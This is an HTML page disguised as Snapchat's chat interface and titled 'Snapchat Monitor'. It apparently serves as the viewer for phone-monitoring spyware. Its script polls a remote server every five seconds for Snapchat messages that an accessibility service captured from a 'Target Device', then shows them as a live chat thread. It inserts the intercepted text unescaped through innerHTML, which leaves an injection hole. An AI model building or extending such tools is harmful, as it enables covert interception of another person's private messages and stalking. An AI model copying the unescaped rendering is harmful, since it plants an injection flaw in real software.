<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- SNAPCHAT THEME CSS --- */
        body { 
            margin: 0; 
            background-color: #f2f2f2; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #fff;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: CHAT LIST --- */
        #snapListScreen { display: flex; flex-direction: column; height: 100%; width: 100%; }
        
        .snap-header { 
            background: #fff; 
            padding: 10px 15px; 
            border-bottom: 1px solid #f0f0f0; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            height: 50px;
        }
        .header-left { display: flex; align-items: center; gap: 10px; }
        .avatar-small { width: 38px; height: 38px; background: #eee; border-radius: 50%; overflow: hidden; }
        .page-title { font-weight: 700; font-size: 1.2rem; color: #000; }
        .header-right { display: flex; gap: 15px; color: #000; font-size: 1.2rem; }

        .friend-list { flex: 1; overflow-y: auto; }
        
        .friend-row { 
            display: flex; align-items: center; 
            padding: 10px 15px; 
            border-bottom: 1px solid #fafafa; 
            cursor: pointer; 
            height: 55px;
        }
        .friend-row:active { background: #f8f8f8; }

        .bitmoji { width: 48px; height: 48px; margin-right: 12px; border-radius: 50%; background: #f0f0f0; overflow: hidden; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #ccc; }
        
        .friend-data { flex: 1; display: flex; flex-direction: column; justify-content: center; }
        .friend-data h3 { margin: 0; font-size: 1.05rem; font-weight: 500; color: #000; }
        
        .status-row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
        .status-icon { width: 12px; height: 12px; border-radius: 3px; display: inline-block; }
        .st-red { background-color: #f23c57; border: 1px solid #f23c57; } 
        .st-text { font-size: 0.8rem; color: #666; font-weight: 400; }

        .cam-btn { 
            width: 40px; height: 40px; border-radius: 50%; 
            display: flex; justify-content: center; align-items: center; 
            color: #ccc; font-size: 1.2rem; border-left: 1px solid #fafafa;
        }

        /* --- VIEW 2: CHAT CONVERSATION --- */
        #snapChatScreen { 
            display: none; 
            flex-direction: column; height: 100%; 
            background: #fff; 
            position: absolute; top: 0; left: 0; width: 100%; 
            z-index: 20; 
        }
        
        .chat-top { 
            padding: 10px; border-bottom: 1px solid #f0f0f0; 
            display: flex; align-items: center; gap: 10px; height: 50px;
        }
        .chat-name { font-weight: 700; font-size: 1.1rem; flex: 1; color: #000; }
        
        .snap-msgs { 
            flex: 1; padding: 15px; overflow-y: auto; 
            display: flex; flex-direction: column; gap: 8px; 
        }
        
        .s-msg { 
            padding: 8px 12px; 
            max-width: 80%; 
            font-size: 1rem; 
            position: relative;
            background: #fcfcfc;
            color: #333;
        }
        
        /* Incoming Style (Left) */
        .s-in { 
            align-self: flex-start; 
            border-left: 3px solid #3cb2e2; 
        }
        .s-sender-name { font-size: 0.7rem; color: #999; display: block; margin-bottom: 2px; }

        .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; }

        .bottom-nav { 
            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; opacity: 0.8; 
        }
        .nav-item { font-size: 1.4rem; color: #ccc; }
        .nav-active { color: #3cb2e2; }

    </style>
</head>
<body>

    <div class="app-container">

        <div id="snapListScreen">
            <div class="snap-header">
                <div class="header-left">
                    <div class="avatar-small">
                        <div style="width:100%; height:100%; background:#FFFC00; display:flex; justify-content:center; align-items:center;">ðŸ‘»</div>
                    </div>
                    <i class="fa-solid fa-magnifying-glass" style="color:#666; font-size:1.1rem"></i>
                </div>
                <div class="page-title">Chat</div>
                <div class="header-right">
                    <i class="fa-solid fa-user-plus"></i>
                    <i class="fa-solid fa-ellipsis" onclick="location.reload()"></i>
                </div>
            </div>

            <div class="friend-list" id="snapContainer">
                <p style="text-align:center; padding-top:20px; color:#999;">Loading Chats...</p>
            </div>

            <div class="bottom-nav">
                <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
                <div class="nav-item nav-active"><i class="fa-regular fa-comment"></i></div>
                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ccc;"></i></div>
                <div class="nav-item"><i class="fa-solid fa-user-group"></i></div>
                <div class="nav-item"><i class="fa-solid fa-play"></i></div>
            </div>
        </div>

        <div id="snapChatScreen">
            <div class="chat-top">
                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#000; cursor:pointer; padding:5px;" onclick="closeSnap()"></i>
                <div class="bitmoji" style="width:35px; height:35px; font-size:1rem; margin-right:5px;">ðŸ‘»</div>
                <div class="chat-name" id="snapName">Friend</div>
                <i class="fa-solid fa-phone" style="font-size:1.1rem; color:#666; margin-right:15px; background:#f0f0f0; padding:8px; border-radius:50%"></i>
                <i class="fa-solid fa-video" style="font-size:1.1rem; color:#666; background:#f0f0f0; padding:8px; border-radius:50%"></i>
            </div>
            
            <div class="snap-msgs" id="snapMsgsBox">
            </div>

            <div class="chat-bottom">
                <i class="fa-solid fa-camera" style="color:#000; font-size:1.2rem; background:#f0f0f0; padding:8px; border-radius:50%"></i>
                <input type="text" class="snap-input" placeholder="Send a chat">
                <i class="fa-solid fa-microphone" style="color:#000; font-size:1.2rem;"></i>
            </div>
        </div>

    </div>

    <script>
        // --- LIVE SERVER LOGIC ---

        const DEVICE_ID = localStorage.getItem('monitoring_id');
        const SERVER_URL = "https://child-v9no.onrender.com/api/get_data";
        
        if (!DEVICE_ID) {
            alert("Device ID missing! Redirecting...");
            window.location.href = 'index.html'; 
        }

        let snapData = [];

        async function fetchSnapData() {
            try {
                // Fetch Chat Logs from Server
                const response = await fetch(`${SERVER_URL}?device_id=${DEVICE_ID}&type=chat_logs`);
                const result = await response.json();

                if (result.status === 'success' && result.data) {
                    
                    // Filter ONLY Snapchat messages
                    const rawLogs = result.data.filter(item => item.app === 'Snapchat');

                    if (rawLogs.length > 0) {
                        // Format messages for UI
                        // Accessibility service sends raw text, so we group them by time
                        const formattedMsgs = rawLogs.map(log => ({
                            text: log.text,
                            time: new Date(log.timestamp).toLocaleTimeString(),
                            fullTime: log.timestamp
                        }));

                        // Combine all into one "Live Activity" thread for simplicity
                        snapData = [{
                            id: 1,
                            name: `Target Device (${DEVICE_ID})`,
                            status: "New Snap Activity",
                            msgs: formattedMsgs.reverse() // Show newest at bottom usually
                        }];
                    } else {
                        snapData = [];
                    }
                    renderSnaps();
                }
            } catch (error) {
                console.error("Error fetching data:", error);
                document.getElementById('snapContainer').innerHTML = "<p style='text-align:center; color:red'>Server Error</p>";
            }
        }

        function renderSnaps() {
            const con = document.getElementById('snapContainer');
            con.innerHTML = "";
            
            if(snapData.length === 0) {
                con.innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Snapchat Logs Found Yet</p>";
                return;
            }

            snapData.forEach(s => {
                con.innerHTML += `
                    <div class="friend-row" onclick="openSnap(${s.id})">
                        <div class="bitmoji">ðŸ‘»</div>
                        <div class="friend-data">
                            <h3>${s.name}</h3>
                            <div class="status-row">
                                <span class="status-icon st-red"></span>
                                <span class="st-text">${s.status}</span>
                            </div>
                        </div>
                        <div class="cam-btn"><i class="fa-regular fa-comment-dots"></i></div>
                    </div>`;
            });
        }

        function openSnap(id) {
            const s = snapData.find(x => x.id === id);
            
            if(s) {
                document.getElementById('snapName').innerText = s.name;
                const box = document.getElementById('snapMsgsBox');
                box.innerHTML = "";
                
                s.msgs.forEach(m => {
                    box.innerHTML += `
                        <div class="s-msg s-in">
                            <span class="s-sender-name">${m.time}</span>
                            ${m.text}
                        </div>`;
                });

                document.getElementById('snapListScreen').style.display = 'none';
                document.getElementById('snapChatScreen').style.display = 'flex';
                box.scrollTop = box.scrollHeight;
            }
        }

        function closeSnap() {
            document.getElementById('snapChatScreen').style.display = 'none';
            document.getElementById('snapListScreen').style.display = 'flex';
        }

        // Auto Refresh every 5 seconds
        fetchSnapData();
        setInterval(fetchSnapData, 5000);

    </script>
</body>
</html>
